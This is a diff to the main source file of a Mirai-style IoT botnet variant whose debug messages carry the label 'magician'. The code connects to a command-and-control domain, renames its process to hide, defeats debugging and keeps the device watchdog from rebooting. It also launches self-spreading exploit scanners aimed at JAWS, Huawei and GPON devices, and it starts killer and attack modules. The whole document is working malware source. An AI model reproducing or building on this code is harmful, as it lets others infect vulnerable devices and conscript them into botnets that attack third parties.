@@ -1,7 +1,7 @@
 #define _GNU_SOURCE
 
 #ifdef DEBUG
-    #include <stdio.h>
+#include <stdio.h>
 #endif
 #include <stdlib.h>
 #include <unistd.h>
@@ -21,13 +21,13 @@
 #include "attack.h"
 #include "resolv.h"
 #include "killer.h"
-#include "scanner.h"
 #include "util.h"
+#include "scanner.h"
 #include "huawei.h"
-#include "hnap.h"
-#include "realtek_scanner.h"
-#include "thinkphp.h"
+#include "jaws.h"
+#include "gpon443.h"
 
+#define SINGLE_INSTANCE_PORT 46157
 
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
@@ -37,99 +37,83 @@ static void ensure_single_instance(void);
 static BOOL unlock_tbl_if_nodebug(char *);
 
 struct sockaddr_in srv_addr;
-int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0;
+int fd_ctrl = -1, fd_serv = -1, ioctl_pid = 0;
 BOOL pending_connection = FALSE;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr;
 
 #ifdef DEBUG
     static void segv_handler(int sig, siginfo_t *si, void *unused)
     {
-        printf("got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
+        printf("[magician] got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
         exit(EXIT_FAILURE);
     }
 #endif
 
-
-void watchdog_maintain(void)
+void ioctl_keepalive(void)
 {
-    watchdog_pid = fork();
-    if(watchdog_pid > 0 || watchdog_pid == -1)
+    ioctl_pid = fork();
+    if(ioctl_pid > 0 || ioctl_pid == -1)
         return;
 
     int timeout = 1;
-    int watchdog_fd = 0;
+    int ioctl_fd = 0;
     int found = FALSE;
 
-    table_unlock_val(TABLE_MISC_WATCHDOG);
-    table_unlock_val(TABLE_MISC_WATCHDOG2);
+    table_unlock_val(TABLE_WATCHDOG_1);
+    table_unlock_val(TABLE_WATCHDOG_2);
+    table_unlock_val(TABLE_WATCHDOG_3);
+    table_unlock_val(TABLE_WATCHDOG_4);
+    table_unlock_val(TABLE_WATCHDOG_5);
+    table_unlock_val(TABLE_WATCHDOG_6);
+    table_unlock_val(TABLE_WATCHDOG_7);
+    table_unlock_val(TABLE_WATCHDOG_8);
+    table_unlock_val(TABLE_WATCHDOG_9);
 
-    if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
-       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1)
+    if((ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_1, NULL), 2)) != -1 ||
+       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_2, NULL), 2)) != -1 ||
+       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_3, NULL), 2)) != -1 ||
+       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_4, NULL), 2)) != -1 ||
+       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_5, NULL), 2)) != -1 ||
+       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_6, NULL), 2)) != -1 ||
+       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_7, NULL), 2)) != -1 ||
+       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_8, NULL), 2)) != -1 ||
+       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_9, NULL), 2)) != -1)
     {
         #ifdef DEBUG
-            printf("[watchdog] found a valid watchdog driver\n");
+            printf("(unstable/main/ioctl) found a driver on the drvice\n");
         #endif
         found = TRUE;
-        ioctl(watchdog_fd, 0x80045704, &timeout);
+        ioctl(ioctl_fd, 0x80045704, &timeout);
     }
-    
+
     if(found)
     {
         while(TRUE)
         {
             #ifdef DEBUG
-                printf("[watchdog] sending keep-alive ioctl call to the watchdog driver\n");
+                printf("(unstable/main/ioctl) sending keep-alive ioctl call to the driver\n");
             #endif
-            ioctl(watchdog_fd, 0x80045705, 0);
+            ioctl(ioctl_fd, 0x80045705, 0);
             sleep(10);
         }
     }
-    
-    table_lock_val(TABLE_MISC_WATCHDOG);
-    table_lock_val(TABLE_MISC_WATCHDOG2);
+
+    table_lock_val(TABLE_WATCHDOG_1);
+    table_lock_val(TABLE_WATCHDOG_2);
+    table_lock_val(TABLE_WATCHDOG_3);
+    table_lock_val(TABLE_WATCHDOG_4);
+    table_lock_val(TABLE_WATCHDOG_5);
+    table_lock_val(TABLE_WATCHDOG_6);
+    table_lock_val(TABLE_WATCHDOG_7);
+    table_lock_val(TABLE_WATCHDOG_8);
+    table_lock_val(TABLE_WATCHDOG_9);
 
     #ifdef DEBUG
-        printf("[watchdog] failed to find a valid watchdog driver, bailing out\n");
+        printf("(unstable/main/ioctl) driver not found\n");
     #endif
-    
+
     exit(0);
 }
-#ifdef SELFREP
-void start_scanner(void)
-{
-	int rand_num = 0, processors = sysconf(_SC_NPROCESSORS_ONLN);
-	
-	srand(time(NULL));
-	rand_num = rand() % 100;
-	
-	if(processors > 1)
-	{
-		#ifdef DEBUG
-			printf("[debug] device has 2 or more processors, running both scanners.");
-		#endif
-		huawei_init();
-		hnapscanner_scanner_init();
-		realtekscanner_scanner_init();
-		thinkphp_scanner();
-		scanner_init();
-	} else if(rand_num > 35)
-	{
-		huawei_init();
-		hnapscanner_scanner_init();
-		realtekscanner_scanner_init();
-		thinkphp_scanner();
-		scanner_init();
-	} else
-	{
-		huawei_init();
-		hnapscanner_scanner_init();
-		realtekscanner_scanner_init();
-		thinkphp_scanner();
-		scanner_init();
-	}
-}
-#endif
-
 
 int main(int argc, char **args)
 {
@@ -138,19 +122,31 @@ int main(int argc, char **args)
 
     #ifndef DEBUG
         sigset_t sigs;
-
         sigemptyset(&sigs);
         sigaddset(&sigs, SIGINT);
         sigprocmask(SIG_BLOCK, &sigs, NULL);
         signal(SIGCHLD, SIG_IGN);
         signal(SIGTRAP, &anti_gdb_entry);
-
     #endif
 
     #ifdef DEBUG
-        printf("DEBUG MODE YO\n");
+        printf("[magician] debug mode, pid: %d\n", getpid());
 
         sleep(1);
+
+        struct sigaction sa;
+
+        sa.sa_flags = SA_SIGINFO;
+        sigemptyset(&sa.sa_mask);
+        sa.sa_sigaction = segv_handler;
+        if(sigaction(SIGSEGV, &sa, NULL) == -1)
+            perror("sigaction");
+
+        sa.sa_flags = SA_SIGINFO;
+        sigemptyset(&sa.sa_mask);
+        sa.sa_sigaction = segv_handler;
+        if(sigaction(SIGBUS, &sa, NULL) == -1)
+            perror("sigaction");
     #endif
 
     LOCAL_ADDR = util_local_addr();
@@ -160,9 +156,8 @@ int main(int argc, char **args)
     srv_addr.sin_port = htons(FAKE_CNC_PORT);
 
     table_init();
-
     anti_gdb_entry(0);
-
+    ensure_single_instance();
     rand_init();
 
     util_zero(id_buf, 32);
@@ -172,27 +167,19 @@ int main(int argc, char **args)
         util_zero(args[1], util_strlen(args[1]));
     }
 
-    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
-    rand_alpha_str(name_buf, name_buf_len);
-    name_buf[name_buf_len] = 0;
-    util_strcpy(args[0], name_buf);
-
-    util_zero(name_buf, 32);
+    util_strcpy(args[0], "");
 
     name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
-    rand_alpha_str(name_buf, name_buf_len);
+    rand_alphastr(name_buf, name_buf_len);
     name_buf[name_buf_len] = 0;
-    prctl(PR_SET_NAME, name_buf);
+
+    prctl(PR_SET_NAME, "a");
 
     table_unlock_val(TABLE_EXEC_SUCCESS);
     tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
     write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
     write(STDOUT, "\n", 1);
     table_lock_val(TABLE_EXEC_SUCCESS);
-
-    attack_init();
-    killer_init();
-    watchdog_maintain();
 
 #ifndef DEBUG
     if (fork() > 0)
@@ -202,12 +189,19 @@ int main(int argc, char **args)
     close(STDOUT);
     close(STDERR);
 #endif
-
     attack_init();
-    killer_init();
-    watchdog_maintain();
+    ioctl_keepalive();
+#ifdef SELFREP
     scanner_init();
+    jaws_scanner();
+    huaweiscanner_scanner_init();
+    gpon443_scanner();
+#endif
 
+#ifdef STABLE
+    killer_init();
+#endif
+    
     while (TRUE)
     {
         fd_set fdsetrd, fdsetwr, fdsetex;
@@ -224,6 +218,7 @@ int main(int argc, char **args)
         // Set up CNC sockets
         if (fd_serv == -1)
             establish_connection();
+
 
         if (pending_connection)
             FD_SET(fd_serv, &fdsetwr);
@@ -242,9 +237,9 @@ int main(int argc, char **args)
         nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
         if (nfds == -1)
         {
-#ifdef DEBUG
-            printf("select() errno = %d\n", errno);
-#endif
+//#ifdef DEBUG
+//            printf("[magician] select() errno = %d\n", errno);
+//#endif
             continue;
         }
         else if (nfds == 0)
@@ -254,7 +249,29 @@ int main(int argc, char **args)
             if (pings++ % 6 == 0)
                 send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
         }
+        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
+        {
+            struct sockaddr_in cli_addr;
+            socklen_t cli_addr_len = sizeof (cli_addr);
 
+            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
+
+#ifdef DEBUG
+            printf("[magician] detected newer instance running! killing process\n");
+#endif
+            #ifdef SELFREP
+                scanner_kill();
+                huaweiscanner_scanner_kill();
+                gpon443_kill();
+                jaws_kill();
+            #endif
+            #ifdef STABLE
+                killer_kill();
+            #endif
+            attack_kill_all();
+            kill(pgid * -1, 9);
+            exit(0);
+        }
         if(pending_connection)
         {
             pending_connection = FALSE;
@@ -262,7 +279,7 @@ int main(int argc, char **args)
             if(!FD_ISSET(fd_serv, &fdsetwr))
             {
                 #ifdef DEBUG
-                    printf("[main] timed out while connecting to CNC\n");
+                    printf("[magician] timed out while connecting to cnc\n");
                 #endif
                 teardown_connection();
             }
@@ -275,7 +292,7 @@ int main(int argc, char **args)
                 if(err != 0)
                 {
                     #ifdef DEBUG
-                        printf("[main] error while connecting to CNC code=%d\n", err);
+                        printf("[magician] error while connecting to cnc, code=%d\n", err);
                     #endif
                     close(fd_serv);
                     fd_serv = -1;
@@ -294,7 +311,7 @@ int main(int argc, char **args)
                     }
 
                     #ifdef DEBUG
-                        printf("[main] connected to CNC.\n");
+                        printf("[magician] connected to cnc successfully\n");
                     #endif
                 }
             }
@@ -318,15 +335,15 @@ int main(int argc, char **args)
             if(n == 0)
             {
                 #ifdef DEBUG
-                    printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
+                    printf("[magician] lost connection with cnc (errno = %d) 1\n", errno);
                 #endif
                 teardown_connection();
                 continue;
             }
 
-            if(len == 0)
+            if(len == 0) // If it is just a ping, no need to try to read in buffer data
             {
-                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
+                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL); // skip buffer forlength
                 continue;
             }
             len = ntohs(len);
@@ -350,7 +367,7 @@ int main(int argc, char **args)
             if(n == 0)
             {
                 #ifdef DEBUG
-                    printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
+                    printf("[magician] lost connection with cnc (errno = %d) 2\n", errno);
                 #endif
                 teardown_connection();
                 continue;
@@ -361,7 +378,7 @@ int main(int argc, char **args)
             recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
 
             #ifdef DEBUG
-                printf("[main] received %d bytes from CNC\n", len);
+                printf("[magician] received %d bytes from cnc\n", len);
             #endif
 
             if(len > 0)
@@ -379,39 +396,37 @@ static void anti_gdb_entry(int sig)
 
 static void resolve_cnc_addr(void)
 {
-    #ifndef USEDOMAIN
-    table_unlock_val(TABLE_CNC_PORT);
-    srv_addr.sin_addr.s_addr = SERVIP;
-    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
-    table_lock_val(TABLE_CNC_PORT);
-    #else
     struct resolv_entries *entries;
-    entries = resolv_lookup(SERVDOM);
+
+    table_unlock_val(TABLE_CNC_DOMAIN);
+    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+    table_lock_val(TABLE_CNC_DOMAIN);
     if (entries == NULL)
     {
-        srv_addr.sin_addr.s_addr = SERVIP;
+#ifdef DEBUG
+        printf("[magician] failed to resolve cnc address\n");
+#endif
         return;
-    } else {
-        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
     }
-    
+    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
     resolv_entries_free(entries);
-    table_unlock_val(TABLE_CNC_PORT);
-    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
-    table_lock_val(TABLE_CNC_PORT);
-    #endif
+    srv_addr.sin_port = htons(59666);
+
+#ifdef DEBUG
+    printf("[magician] resolved domain\n");
+#endif
 }
 
 static void establish_connection(void)
 {
     #ifdef DEBUG
-        printf("[main] attempting to connect to CNC\n");
+        printf("[magician] attempting to connect to cnc\n");
     #endif
 
     if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
         #ifdef DEBUG
-            printf("[main] failed to call socket(). Errno = %d\n", errno);
+            printf("[magician] failed to call socket(). errno = %d\n", errno);
         #endif
         return;
     }
@@ -428,7 +443,7 @@ static void establish_connection(void)
 static void teardown_connection(void)
 {
     #ifdef DEBUG
-        printf("[main] tearing down connection to CNC!\n");
+        printf("[magician] tearing down connection to cnc!\n");
     #endif
 
     if(fd_serv != -1)
@@ -436,4 +451,64 @@ static void teardown_connection(void)
 
     fd_serv = -1;
     sleep(1);
+}
+
+static void ensure_single_instance(void)
+{
+    static BOOL local_bind = TRUE;
+    struct sockaddr_in addr;
+    int opt = 1;
+
+    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+        return;
+    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
+    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));
+
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT);
+
+    // Try to bind to the control port
+    errno = 0;
+    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+    {
+        if (errno == EADDRNOTAVAIL && local_bind)
+            local_bind = FALSE;
+#ifdef DEBUG
+        printf("[magician] another instance is already running (errno = %d)! sending kill request ..\r\n", errno);
+#endif
+
+        // Reset addr just in case
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = INADDR_ANY;
+        addr.sin_port = htons(SINGLE_INSTANCE_PORT);
+
+        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+        {
+#ifdef DEBUG
+            printf("[magician] failed to connect to fd_ctrl to request process termination\n");
+#endif
+        }
+
+        sleep(5);
+        close(fd_ctrl);
+        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+        ensure_single_instance(); // Call again, so that we are now the control
+    }
+    else
+    {
+        if (listen(fd_ctrl, 1) == -1)
+        {
+#ifdef DEBUG
+            printf("[magician] failed to call listen() on fd_ctrl\n");
+            close(fd_ctrl);
+            sleep(5);
+            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+            ensure_single_instance();
+#endif
+        }
+#ifdef DEBUG
+        printf("[magician] we are the only process on this system!\n");
+#endif
+    }
 }
